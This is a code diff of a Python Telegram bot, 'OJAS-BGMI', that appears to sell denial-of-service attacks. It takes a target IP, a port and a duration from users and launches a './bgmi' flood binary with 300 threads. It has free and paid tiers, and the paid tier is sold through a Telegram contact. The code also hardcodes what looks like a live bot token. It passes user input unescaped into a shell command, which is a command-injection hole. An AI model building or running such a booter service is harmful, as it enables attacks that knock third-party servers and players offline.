@@ -4,7 +4,7 @@ import time
 import threading
 from keep_alive import keep_alive
 
-# Bot Setup (Apna bot token change mat karna)
+# Bot Setup
 bot = telebot.TeleBot('8636140344:AAEUh1GNRu7vD9Rby_0dEIkz-dIODPxdsKA')
 
 # 💎 PREMIUM USERS LIST (Add IDs here to make them Premium)
@@ -18,7 +18,7 @@ awaiting_feedback = {}
 
 active_free_attacks = 0
 active_premium_attacks = 0
-attack_lock = threading.Lock() # To safely count concurrent attacks
+attack_lock = threading.Lock() 
 
 # 1. DYNAMIC WELCOME MESSAGE
 @bot.message_handler(commands=['start'])
@@ -26,11 +26,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     user_id = str(message.chat.id)
     
-    # Check Tier
-    if user_id in PREMIUM_USERS:
-        tier_display = "Premium User 💎"
-    else:
-        tier_display = "Free User 🆓"
+    tier_display = "Premium User 💎" if user_id in PREMIUM_USERS else "Free User 🆓"
 
     response = f"<b>🌟 WELCOME TO OJAS-BGMI 🌟</b>\n\n"
     response += f"👤 <b>User:</b> {user_name}\n"
@@ -56,7 +52,7 @@ def info(message):
     response = f"👤 <b>User:</b> {message.from_user.first_name}\n🆔 <b>ID:</b> <code>{user_id}</code>\n🛡️ <b>Plan:</b> {tier}"
     bot.reply_to(message, response, parse_mode='HTML')
 
-# 4. FEEDBACK HANDLER (Photo check)
+# 4. FEEDBACK HANDLER
 @bot.message_handler(content_types=['photo'])
 def handle_feedback(message):
     user_id = str(message.chat.id)
@@ -64,23 +60,23 @@ def handle_feedback(message):
         awaiting_feedback[user_id] = False
         bot.reply_to(message, "✅ <b>Feedback accepted! You can now launch your next attack.</b>", parse_mode='HTML')
 
-# 5. BACKGROUND ATTACK PROCESS (Makhan Smooth Progress Bar)
+# 5. BACKGROUND ATTACK PROCESS (With 100% Completion Fix & 300 Threads)
 def process_attack(target, port, duration, chat_id, sent_msg_id, user_name, user_tier, user_id):
     global active_free_attacks, active_premium_attacks
     
-    # Popen ensures attack runs in background without blocking Python
-    subprocess.Popen(f"./bgmi {target} {port} {duration} 100", shell=True)
+    # ⚡ Threads updated to 300 for maximum hit power on Render
+    subprocess.Popen(f"./bgmi {target} {port} {duration} 300", shell=True)
     
     start_time = time.time()
-    update_count = 1
+    update_count = 0.5
     
-    # Smooth Progress Bar Loop
+    # Live Progress Loop
     while True:
-        time.sleep(1) # Exactly 5 seconds interval
+        time.sleep(7)  # ⚡ 7 Seconds breathing room to prevent server hang
         elapsed = int(time.time() - start_time)
         
         if elapsed >= duration:
-            break # Time is up! Move to 100% final update
+            break # Time is up, exit the loop!
             
         progress = min(100, int((elapsed / duration) * 100))
         remaining = max(0, duration - elapsed)
@@ -102,10 +98,9 @@ def process_attack(target, port, duration, chat_id, sent_msg_id, user_name, user
             bot.edit_message_text(new_text, chat_id, sent_msg_id, parse_mode='HTML')
             update_count += 1
         except Exception:
-            pass # Ignore Telegram Rate Limits and continue looping
-            
+            pass 
+
     # 🛑 THE FIX: FINAL 100% UPDATE MESSAGE 🛑
-    # Ye block ensure karega ki bar atak kar na rahe, seedha 100% show kare.
     final_text = f"🚀 <b>ATTACK FINISHED</b> 🚀\n\n"
     final_text += f"📌 <b>Target:</b> <code>{target}:{port}</code>\n"
     final_text += f"⏱️ <b>Duration:</b> {duration} seconds\n"
@@ -120,15 +115,15 @@ def process_attack(target, port, duration, chat_id, sent_msg_id, user_name, user
         bot.edit_message_text(final_text, chat_id, sent_msg_id, parse_mode='HTML')
     except Exception:
         pass
-        
-    # Free Up Server Slots Safely
+
+    # Free Up Server Slots
     with attack_lock:
         if user_tier == 'free':
             active_free_attacks = max(0, active_free_attacks - 1)
         else:
             active_premium_attacks = max(0, active_premium_attacks - 1)
 
-    # Final Message & Enable Feedback Lock
+    # Final Feedback Prompt
     bot.send_message(chat_id, "✅ <b>Attack Completed Successfully!</b>\n\n⚠️ <i>Please send a feedback screenshot to unlock your next attack.</i>", parse_mode='HTML')
     user_cooldowns[user_id] = time.time()
     awaiting_feedback[user_id] = True
@@ -142,20 +137,17 @@ def handle_bgmi(message):
     user_name = message.from_user.first_name
     user_tier = "premium" if user_id in PREMIUM_USERS else "free"
 
-    # Check Feedback Lock
     if awaiting_feedback.get(user_id, False):
         bot.reply_to(message, "⚠️ <b>You must send a feedback photo before your next attack!</b>\n<i>Please send any screenshot/photo as feedback.</i>", parse_mode='HTML')
         return
 
-    # Check Anti-Spam Cooldown
     if user_id in user_cooldowns:
         time_since_last = time.time() - user_cooldowns[user_id]
-        if time_since_last < 30: # 30 Seconds Cooldown
+        if time_since_last < 30: 
             remaining_cd = int(30 - time_since_last)
             bot.reply_to(message, f"⏳ <b>Cooldown active! Wait {remaining_cd}s before next attack.</b>", parse_mode='HTML')
             return
 
-    # Parse Command
     command = message.text.split()
     if len(command) != 4:
         bot.reply_to(message, "<b>Usage:</b> <code>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</code>", parse_mode='HTML')
@@ -168,7 +160,6 @@ def handle_bgmi(message):
         bot.reply_to(message, "⚠️ <b>Time must be an integer!</b>", parse_mode='HTML')
         return
 
-    # TIER BASED DURATION LIMITS
     if user_tier == "free" and duration > 60:
         bot.reply_to(message, "⚠️ <b>FREE PLAN LIMIT EXCEEDED!</b>\n\nFree users can only attack for up to 60 seconds. <b>Purchase Premium</b> to attack up to 600 seconds! DM @mesh213", parse_mode='HTML')
         return
@@ -176,7 +167,6 @@ def handle_bgmi(message):
         bot.reply_to(message, "⚠️ <b>MAX LIMIT EXCEEDED!</b>\nPremium users can attack for a maximum of 600 seconds.", parse_mode='HTML')
         return
 
-    # CONCURRENCY CONTROL
     with attack_lock:
         if user_tier == "free":
             if active_free_attacks >= 1:
@@ -189,7 +179,6 @@ def handle_bgmi(message):
                 return
             active_premium_attacks += 1
 
-    # INITIALIZE MESSAGE INSTANTLY
     initial_text = f"🚀 <b>ATTACK IN PROGRESS</b> 🚀\n\n"
     initial_text += f"📌 <b>Target:</b> <code>{target}:{port}</code>\n"
     initial_text += f"⏱️ <b>Duration:</b> {duration} seconds\n"
@@ -202,7 +191,6 @@ def handle_bgmi(message):
 
     sent_msg = bot.send_message(message.chat.id, initial_text, parse_mode='HTML')
 
-    # Start Attack in Background Thread
     threading.Thread(target=process_attack, args=(target, port, duration, message.chat.id, sent_msg.message_id, user_name, user_tier, user_id)).start()
 
 bot.polling(none_stop=True)
